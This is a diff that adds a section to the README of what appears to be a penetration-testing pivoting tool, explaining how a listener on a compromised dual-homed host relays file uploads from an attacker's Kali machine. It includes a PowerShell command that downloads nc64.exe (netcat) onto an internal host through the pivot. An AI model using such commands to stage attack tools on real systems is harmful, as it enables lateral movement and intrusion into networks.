@@ -159,6 +159,19 @@ Upload done and we are good to access the new network:
 
 <b>For Linux, if you need to access a container on the same host, the tool will help you do that too! just put the container network ip in the interface field).</b>
 
+### File Uploading with pivoting tab
+
+Fot both windows and linux host examples above, a listener is added on the host that the reverse is sent from, if you are on one of the internal hosts, you will not be able to access kali directly.
+
+To solve this problem a listener is added, to use it follow this example which will upload nc64.exe to the internal host, make sur you have python http server on port 80 on your kali:
+
+
+```
+iwr -uri http://10.0.2.5:1234/nc64.exe -Outfile nc64.exe
+
+```
+The above command will send the request to the dual host port "1234" that we send the reverse shell from then the host will forward it to port "80" on kali and the file will be uploaded.
+
 ## Attacks Tab:
 
 
